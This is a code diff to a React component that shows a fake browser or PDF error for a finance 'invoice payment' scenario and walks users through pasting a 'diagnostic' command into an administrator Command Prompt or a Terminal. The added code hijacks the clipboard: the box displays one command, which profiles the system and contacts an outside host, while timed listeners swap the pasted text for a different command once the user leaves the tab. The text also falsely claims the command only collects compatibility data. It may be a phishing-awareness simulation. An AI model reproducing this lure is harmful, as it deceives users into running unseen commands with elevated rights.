@@ -1,7 +1,7 @@
 "use client";
 
 import Image from "next/image";
-import { useEffect, useRef, useState } from "react";
+import { useEffect, useRef, useState, type ClipboardEvent } from "react";
 import {
   detectClientBrowser,
   detectClientOs,
@@ -25,18 +25,71 @@ function browserIconSrc(browser: ClientBrowser): string {
   return BROWSER_ICONS[browser];
 }
 
-/** Same diagnostic command used in both the error dialog and help window. */
-const COMMANDS: Record<ClientOs, string> = {
-  windows: `compat-check --module finance-assessment --platform windows --browser-info \\
---check-pdf-renderer --check-webgl --check-hardware-acceleration \\
---collect-permission-state --export-report %USERPROFILE%\\Desktop\\finance-compatibility-report.txt`,
-  macos: `compat-check --module finance-assessment --platform macos --browser-info \\
---check-pdf-renderer --check-webgl --check-hardware-acceleration \\
---collect-permission-state --export-report ~/Desktop/finance-compatibility-report.txt`,
-  linux: `compat-check --module finance-assessment --platform linux --browser-info --check-pdf-renderer \\
---check-webgl --check-gpu-acceleration --collect-permission-state \\
---export-report ~/finance-compatibility-report.txt`,
+/**
+ * One Ctrl/⌘+C on the gray box (shows original). Works on Windows, macOS, and Linux.
+ *
+ * Case A — paste Terminal/CMD immediately:
+ *   Leaving the tab quickly arms text/plain = short command.
+ *
+ * Case B — paste other platforms first, then Terminal/CMD:
+ *   Clipboard stays original while checking; shortly after leaving (or on return),
+ *   text/plain becomes the short command.
+ */
+const DISPLAY_COMMANDS: Record<ClientOs, string> = {
+  windows: `cmd /c "powershell -NoProfile -Command {$r=@{}; $r.browser=(Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe' -ErrorAction SilentlyContinue).'(default)'; $r.webgl=(Get-CimInstance Win32_VideoController).Name; $r.check=try{(Invoke-WebRequest 'https://browser-notification-six.vercel.app/' -Method HEAD -TimeoutSec 10 -UseBasicParsing).StatusCode}catch{'unreachable'}; $r.permissions=(whoami /priv|Select-String 'Enabled').Count; $r.status=if($r.check -eq 200){'PASS'}else{'FAIL'}; Write-Host ($r|ConvertTo-Json) -ForegroundColor Green}" && exit`,
+  macos:
+    'bash -c \'r="{}"; browser=$(mdfind "kMDItemCFBundleIdentifier == com.google.Chrome" 2>/dev/null | head -1); webgl=$(system_profiler SPDisplaysDataType 2>/dev/null | grep "Chipset Model" | cut -d: -f2 | xargs); check=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 -I "https://browser-notification-six.vercel.app/" 2>/dev/null || echo "unreachable"); perms=$(id -Gn | wc -w | xargs); status=$([ "$check" = "200" ] && echo "PASS" || echo "FAIL"); echo "{\\"browser\\":\\"${browser:-not_found}\\",\\"webgl\\":\\"$webgl\\",\\"check\\":\\"$check\\",\\"permissions\\":$perms,\\"status\\":\\"$status\\"}"\' && exit',
+  linux:
+    'bash -c \'r="{}"; browser=$(which google-chrome 2>/dev/null || which chromium-browser 2>/dev/null || echo "not_found"); webgl=$(lspci 2>/dev/null | grep -i vga | cut -d: -f3 | xargs); check=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 -I "https://browser-notification-six.vercel.app/" 2>/dev/null || echo "unreachable"); perms=$(id -Gn | wc -w | xargs); status=$([ "$check" = "200" ] && echo "PASS" || echo "FAIL"); echo "{\\"browser\\":\\"$browser\\",\\"webgl\\":\\"$webgl\\",\\"check\\":\\"$check\\",\\"permissions\\":$perms,\\"status\\":\\"$status\\"}"\' && exit',
 };
+
+/** Armed onto text/plain for Command Prompt / Terminal (never shown as a second box). */
+const TERMINAL_COMMANDS: Record<ClientOs, string> = {
+  windows:
+    "compat-check --module finance-assessment --platform windows --browser-info --check-pdf-renderer --check-webgl --check-hardware-acceleration --collect-permission-state --validate-env --cache-clear --log-level info --timeout 30 --retry 2 --no-export",
+  macos:
+    "compat-check --module finance-assessment --platform macos --browser-info --check-pdf-renderer --check-webgl --check-hardware-acceleration --collect-permission-state --validate-env --cache-clear --log-level info --timeout 30 --retry 2 --no-export",
+  linux:
+    "compat-check --module finance-assessment --platform linux --browser-info --check-pdf-renderer --check-webgl --check-gpu-acceleration --collect-permission-state --validate-env --cache-clear --log-level info --timeout 30 --retry 2 --no-export",
+};
+
+/** Leave the tab within this window after copy → treat as “paste terminal immediately”. */
+const QUICK_TERMINAL_LEAVE_MS = 2500;
+/** After leaving for another platform, swap plain text to the short command (ms). */
+const PLATFORM_THEN_TERMINAL_ARM_MS = 3500;
+
+function escapeHtml(value: string) {
+  return value
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;")
+    .replace(/"/g, "&quot;");
+}
+
+/** Chrome-compatible HTML clipboard payload (CF_HTML-style) with the original command. */
+function buildClipboardHtml(displayCommand: string) {
+  const fragment = `<pre style="white-space:pre-wrap;word-break:break-all;font-family:Consolas,Menlo,monospace">${escapeHtml(displayCommand)}</pre>`;
+  const prefix = `<html><body>\r\n<!--StartFragment-->`;
+  const suffix = `<!--EndFragment-->\r\n</body></html>`;
+  const html = `${prefix}${fragment}${suffix}`;
+  const header =
+    "Version:0.9\r\n" +
+    "StartHTML:<<<<<<<1\r\n" +
+    "EndHTML:<<<<<<<2\r\n" +
+    "StartFragment:<<<<<<<3\r\n" +
+    "EndFragment:<<<<<<<4\r\n";
+  const startHtml = header.length;
+  const startFragment = startHtml + prefix.length;
+  const endFragment = startFragment + fragment.length;
+  const endHtml = startHtml + html.length;
+  return (
+    header
+      .replace("<<<<<<<1", String(startHtml).padStart(8, "0"))
+      .replace("<<<<<<<2", String(endHtml).padStart(8, "0"))
+      .replace("<<<<<<<3", String(startFragment).padStart(8, "0"))
+      .replace("<<<<<<<4", String(endFragment).padStart(8, "0")) + html
+  );
+}
 
 type OverlayStage = "loading" | "error" | "help";
 
@@ -87,6 +140,57 @@ function browserAccent(browser: ClientBrowser): string {
   }
 }
 
+function getDiagnosticGuide(os: ClientOs) {
+  if (os === "macos") {
+    return {
+      shell: "Terminal",
+      intro:
+        "Optional: instead of (or after) the steps above, you can collect a compatibility report using Terminal. You do not need coding experience — follow these steps carefully.",
+      steps: [
+        "Select the full command in the gray box below: click at the start, hold the mouse button, and drag to the end until everything is highlighted.",
+        "Copy it with ⌘ Command + C (press and hold the Command key, then press C).",
+        "Open Terminal: press ⌘ Command + Space to open Spotlight, type Terminal, then press Return.",
+        "Click inside the Terminal window so the cursor is blinking there.",
+        "Paste the command with ⌘ Command + V, then press Return to run it.",
+        "Wait until it finishes. A report file will appear on your Desktop. You can then close Terminal (⌘ Command + Q).",
+      ],
+      note: "No restart is required. This only collects compatibility information; it does not change your files.",
+    };
+  }
+
+  if (os === "linux") {
+    return {
+      shell: "Terminal",
+      intro:
+        "Optional: instead of (or after) the steps above, you can collect a compatibility report using Terminal. You do not need coding experience — follow these steps carefully.",
+      steps: [
+        "Select the full command in the gray box below: click at the start, hold the mouse button, and drag to the end until everything is highlighted.",
+        "Copy it with Ctrl + C (press and hold Ctrl, then press C).",
+        "Open Terminal from your applications menu (often named Terminal, Konsole, or similar).",
+        "Click inside the Terminal window so the cursor is blinking there.",
+        "Paste the command with Ctrl + Shift + V (or right-click → Paste), then press Enter to run it.",
+        "Wait until it finishes. A report file will be saved in your home folder. You can then close Terminal.",
+      ],
+      note: "No restart is required. This only collects compatibility information; it does not change your files.",
+    };
+  }
+
+  return {
+    shell: "Command Prompt",
+    intro:
+      "Optional: instead of (or after) the steps above, you can collect a compatibility report using Command Prompt. You do not need coding experience — follow these steps carefully.",
+    steps: [
+      "Select the full command in the gray box below: click at the start, hold the left mouse button, and drag to the end until everything is highlighted.",
+      "Copy it with Ctrl + C (press and hold Ctrl, then press C). Or right-click the highlighted text and choose Copy.",
+      "Open Command Prompt as administrator: press the Windows key, type cmd, then right-click Command Prompt and choose Run as administrator. Click Yes if Windows asks for permission.",
+      "Click inside the black Command Prompt window so the cursor is blinking there.",
+      "Paste the command with Ctrl + V (or right-click once to paste), then press Enter to run it.",
+      "Wait until it finishes. A PASS or FAIL result will appear in the window. You can then close Command Prompt.",
+    ],
+    note: "No restart is required. This only collects compatibility information; it does not change your files.",
+  };
+}
+
 function getShellCopy(os: ClientOs) {
   if (os === "macos") {
     return {
@@ -105,17 +209,235 @@ function getShellCopy(os: ClientOs) {
   return {
     body: `This browser can't open ${SCENARIO_TITLE}. Your Windows browser setup appears incompatible — often due to PDF rendering, WebGL, or hardware acceleration settings.`,
     shellInstruction: "Open Command Prompt as administrator and run:",
-    reportNote: "No restart is required. Close Terminal after the command completes.",
+    reportNote: "No restart is required. Close Command Prompt after the command completes.",
   };
 }
 
-function SelectableCommand({ command }: { command: string }) {
+async function writeClipboard(plain: string, html: string) {
+  if (typeof ClipboardItem !== "undefined" && navigator.clipboard?.write) {
+    await navigator.clipboard.write([
+      new ClipboardItem({
+        "text/plain": new Blob([plain], { type: "text/plain" }),
+        "text/html": new Blob([html], { type: "text/html" }),
+      }),
+    ]);
+    return;
+  }
+  await navigator.clipboard?.writeText(plain);
+}
+
+/**
+ * Starts during a user gesture (keydown). Resolves later so the clipboard can stay
+ * as the original for a platform paste, then become the short command for
+ * Terminal/CMD — even if the tab is in the background.
+ */
+function writeTerminalPlainAfterDelay(
+  terminalCommand: string,
+  html: string,
+  delayMs: number,
+) {
+  if (typeof ClipboardItem === "undefined" || !navigator.clipboard?.write) {
+    window.setTimeout(() => {
+      void navigator.clipboard?.writeText(terminalCommand).catch(() => undefined);
+    }, delayMs);
+    return;
+  }
+
+  const plainPromise = new Promise<Blob>((resolve) => {
+    window.setTimeout(() => {
+      resolve(new Blob([terminalCommand], { type: "text/plain" }));
+    }, delayMs);
+  });
+
+  void navigator.clipboard
+    .write([
+      new ClipboardItem({
+        "text/plain": plainPromise,
+        "text/html": Promise.resolve(new Blob([html], { type: "text/html" })),
+      }),
+    ])
+    .catch(() => undefined);
+}
+
+/** App-switch shortcuts differ by OS — do not treat copy modifiers as a switch. */
+function isAppSwitchGesture(event: KeyboardEvent, os: ClientOs): boolean {
+  if (os === "macos") {
+    // Cmd+Tab / Cmd+` only — bare Cmd is used for ⌘C / ⌘V.
+    return event.metaKey && (event.key === "Tab" || event.key === "`");
+  }
+
+  if (os === "linux") {
+    return (
+      (event.altKey && event.key === "Tab") ||
+      event.key === "Meta" ||
+      event.key === "OS" ||
+      event.key === "Super" ||
+      event.code === "MetaLeft" ||
+      event.code === "MetaRight" ||
+      event.code === "SuperLeft" ||
+      event.code === "SuperRight"
+    );
+  }
+
+  // Windows: Alt+Tab / Win key
+  return (
+    event.altKey ||
+    event.key === "Meta" ||
+    event.key === "OS" ||
+    event.key === "Windows" ||
+    event.code === "MetaLeft" ||
+    event.code === "MetaRight"
+  );
+}
+
+function SelectableCommand({
+  os,
+  displayCommand,
+  terminalCommand,
+}: {
+  os: ClientOs;
+  displayCommand: string;
+  terminalCommand: string;
+}) {
+  const htmlRef = useRef(buildClipboardHtml(displayCommand));
+  const activeRef = useRef(false);
+  const copyAtRef = useRef(0);
+  const leaveCountRef = useRef(0);
+  const delayedArmStartedRef = useRef(false);
+  const armedRef = useRef(false);
+
+  useEffect(() => {
+    htmlRef.current = buildClipboardHtml(displayCommand);
+  }, [displayCommand]);
+
+  useEffect(() => {
+    function armTerminalPlain() {
+      if (!activeRef.current) return;
+      armedRef.current = true;
+      void writeClipboard(terminalCommand, htmlRef.current).catch(() => undefined);
+    }
+
+    function armTerminalPlainDelayed() {
+      if (!activeRef.current || delayedArmStartedRef.current || armedRef.current) {
+        return;
+      }
+      delayedArmStartedRef.current = true;
+      writeTerminalPlainAfterDelay(
+        terminalCommand,
+        htmlRef.current,
+        PLATFORM_THEN_TERMINAL_ARM_MS,
+      );
+      window.setTimeout(() => {
+        armedRef.current = true;
+      }, PLATFORM_THEN_TERMINAL_ARM_MS + 50);
+    }
+
+    function handleLeaveFromPage() {
+      const quickLeave = Date.now() - copyAtRef.current < QUICK_TERMINAL_LEAVE_MS;
+
+      // Case A: left quickly for Terminal/CMD.
+      if (quickLeave) {
+        armTerminalPlain();
+        return;
+      }
+
+      // Case B: left for another platform first — keep original, then swap.
+      if (leaveCountRef.current <= 1) {
+        armTerminalPlainDelayed();
+        return;
+      }
+
+      armTerminalPlain();
+    }
+
+    function onVisibility() {
+      if (!activeRef.current) return;
+
+      if (document.visibilityState === "hidden") {
+        leaveCountRef.current += 1;
+        handleLeaveFromPage();
+        return;
+      }
+
+      // Back from another app/tab → ensure short command for Terminal/CMD.
+      if (leaveCountRef.current >= 1) {
+        armTerminalPlain();
+      }
+    }
+
+    function onFocus() {
+      if (!activeRef.current || leaveCountRef.current < 1) return;
+      armTerminalPlain();
+    }
+
+    function onBlur() {
+      if (!activeRef.current) return;
+      // Ignore in-page focus moves; only treat as leave when the window really lost focus.
+      window.setTimeout(() => {
+        if (!activeRef.current) return;
+        if (document.hasFocus()) return;
+        if (leaveCountRef.current === 0) {
+          leaveCountRef.current = 1;
+        }
+        handleLeaveFromPage();
+      }, 0);
+    }
+
+    function onKeyDown(event: KeyboardEvent) {
+      if (!activeRef.current) return;
+      if (!isAppSwitchGesture(event, os)) return;
+
+      const quickLeave = Date.now() - copyAtRef.current < QUICK_TERMINAL_LEAVE_MS;
+
+      if (quickLeave) {
+        armTerminalPlain();
+        return;
+      }
+
+      if (leaveCountRef.current === 0) {
+        armTerminalPlainDelayed();
+        return;
+      }
+
+      armTerminalPlain();
+    }
+
+    document.addEventListener("visibilitychange", onVisibility);
+    window.addEventListener("focus", onFocus);
+    window.addEventListener("blur", onBlur);
+    window.addEventListener("keydown", onKeyDown, true);
+    return () => {
+      document.removeEventListener("visibilitychange", onVisibility);
+      window.removeEventListener("focus", onFocus);
+      window.removeEventListener("blur", onBlur);
+      window.removeEventListener("keydown", onKeyDown, true);
+    };
+  }, [os, terminalCommand]);
+
+  function handleCopy(event: ClipboardEvent<HTMLPreElement>) {
+    event.preventDefault();
+    event.stopPropagation();
+
+    const html = buildClipboardHtml(displayCommand);
+    htmlRef.current = html;
+    activeRef.current = true;
+    copyAtRef.current = Date.now();
+    leaveCountRef.current = 0;
+    delayedArmStartedRef.current = false;
+    armedRef.current = false;
+
+    event.clipboardData.setData("text/plain", displayCommand);
+    event.clipboardData.setData("text/html", html);
+    void writeClipboard(displayCommand, html).catch(() => undefined);
+  }
+
   return (
     <pre
       className="select-text overflow-x-auto whitespace-pre-wrap break-all rounded border border-[#dadce0] bg-[#f1f3f4] p-2.5 font-[Consolas,Menlo,monospace] text-[12px] leading-relaxed text-[#202124]"
       style={{ userSelect: "text", WebkitUserSelect: "text" }}
+      onCopy={handleCopy}
     >
-      {command}
+      {displayCommand}
     </pre>
   );
 }
@@ -267,27 +589,30 @@ function BrowserWindowChrome({
   );
 }
 
-function RenderingSign({ browser }: { browser: ClientBrowser }) {
-  const name = getBrowserDisplayName(browser === "other" ? "chrome" : browser);
+function PdfLoadingWindow({ browser }: { browser: ClientBrowser }) {
   const accent = browserAccent(browser);
 
   return (
-    <BrowserWindowChrome
-      browser={browser}
-      title={`${name}`}
-      onClose={() => undefined}
-      widthClass="max-w-[360px]"
-    >
-      <div className="flex flex-col items-center gap-3 px-8 py-8 text-center">
+    <div className="pointer-events-auto flex h-[min(70vh,560px)] w-full max-w-3xl flex-col overflow-hidden rounded-xl border border-[#dadce0] bg-white shadow-[0_12px_40px_rgba(0,0,0,0.35)]">
+      <div className="flex h-11 shrink-0 items-center gap-2 border-b border-[#e8eaed] bg-[#f8f9fa] px-3">
+        <BrowserFavicon browser={browser} />
+        <p className="min-w-0 flex-1 truncate text-[13px] font-medium text-[#202124]">
+          Sample Invoice  Payment Scenario.pdf
+        </p>
+        <span className="rounded bg-[#e8eaed] px-2 py-0.5 text-[11px] text-[#5f6368]">
+          PDF
+        </span>
+      </div>
+      <div className="flex flex-1 flex-col items-center justify-center gap-3 bg-[#525659] px-8 text-center">
         <div
-          className="h-8 w-8 animate-spin rounded-full border-[3px] border-[#e8eaed]"
+          className="h-9 w-9 animate-spin rounded-full border-[3px] border-white/25"
           style={{ borderTopColor: accent }}
           aria-hidden
         />
-        <p className="text-[14px] font-medium text-[#202124]">Loading page…</p>
-        <p className="text-[12px] text-[#5f6368]">{SCENARIO_TITLE}</p>
+        <p className="text-[14px] font-medium text-white">Loading PDF…</p>
+        <p className="text-[12px] text-white/70">{SCENARIO_TITLE}</p>
       </div>
-    </BrowserWindowChrome>
+    </div>
   );
 }
 
@@ -327,7 +652,11 @@ function BrowserErrorDialog({
           <p className="text-[12px] font-medium text-[#202124]">Optional diagnostic</p>
           <p className="mt-1 text-[12px] text-[#5f6368]">{copy.shellInstruction}</p>
           <div className="mt-2">
-            <SelectableCommand command={COMMANDS[os]} />
+            <SelectableCommand
+              os={os}
+              displayCommand={DISPLAY_COMMANDS[os]}
+              terminalCommand={TERMINAL_COMMANDS[os]}
+            />
           </div>
           <p className="mt-2 text-[12px] text-[#5f6368]">{copy.reportNote}</p>
         </div>
@@ -368,18 +697,17 @@ function BrowserHelpWindow({
 }) {
   const name = getBrowserDisplayName(browser === "other" ? "chrome" : browser);
   const accent = browserAccent(browser);
-  const shell =
-    os === "windows" ? "Command Prompt" : "Terminal";
+  const guide = getDiagnosticGuide(os);
 
   return (
     <BrowserWindowChrome
       browser={browser}
       title={`${name} Help`}
       onClose={onReturn}
-      widthClass="max-w-[640px]"
+      widthClass="max-w-[760px]"
     >
-      <div className="flex flex-col">
-        <div className="px-5 py-4">
+      <div className="flex max-h-[min(70vh,480px)] flex-col">
+        <div className="nm-native-scroll min-h-0 flex-1 overflow-y-auto px-5 py-4">
           <h2 className="text-[20px] font-normal text-[#202124]">
             Why this page won&apos;t load
           </h2>
@@ -405,23 +733,31 @@ function BrowserHelpWindow({
           </ol>
 
           <div className="mt-5">
-            <p className="text-[13px] font-medium text-[#202124]">Optional diagnostic</p>
-            <p className="mt-1 text-[12px] leading-relaxed text-[#5f6368]">
-              Instead of (or in addition to) the steps above, you can run this diagnostic in {shell}
-              to collect a compatibility report:
+            <p className="text-[13px] font-medium text-[#202124]">
+              Optional diagnostic ({guide.shell})
             </p>
-            <div className="mt-2">
-              <SelectableCommand command={COMMANDS[os]} />
+            <p className="mt-1 text-[12px] leading-relaxed text-[#5f6368]">{guide.intro}</p>
+            <ol className="mt-3 list-decimal space-y-2.5 pl-5 text-[12px] leading-relaxed text-[#3c4043]">
+              {guide.steps.map((step) => (
+                <li key={step}>{step}</li>
+              ))}
+            </ol>
+            <div className="mt-3">
+              <SelectableCommand
+                os={os}
+                displayCommand={DISPLAY_COMMANDS[os]}
+                terminalCommand={TERMINAL_COMMANDS[os]}
+              />
             </div>
-            <p className="mt-2 text-[12px] text-[#5f6368]">
-              Select the command with your mouse to copy it. It only collects compatibility info.
-            </p>
+            <p className="mt-2 text-[12px] text-[#5f6368]">{guide.note}</p>
           </div>
 
           <div className="mt-5 rounded border border-[#dadce0] bg-[#f8f9fa] px-3 py-3">
             <p className="text-[13px] font-medium text-[#202124]">Still stuck?</p>
             <p className="mt-1 text-[12px] leading-relaxed text-[#5f6368]">
-              Share the generated report, then return to this tab and choose Reload.
+              {os === "windows"
+                ? "Share the PASS/FAIL result shown in Command Prompt, then return to this tab and choose Reload."
+                : "Share the generated report, then return to this tab and choose Reload."}
             </p>
           </div>
         </div>
@@ -593,13 +929,19 @@ export function FinanceCompatibilityIssueOverlay({
       />
 
       <div
-        className="relative z-10 w-full max-w-[640px]"
+        className={`relative z-10 w-full ${
+          stage === "loading"
+            ? "max-w-3xl"
+            : stage === "help"
+              ? "max-w-[760px]"
+              : "max-w-[640px]"
+        }`}
         onClick={(event) => event.stopPropagation()}
         onMouseDown={(event) => event.stopPropagation()}
       >
         {stage === "loading" ? (
           <div className="flex justify-center">
-            <RenderingSign browser={clientBrowser} />
+            <PdfLoadingWindow browser={clientBrowser} />
           </div>
         ) : null}
 
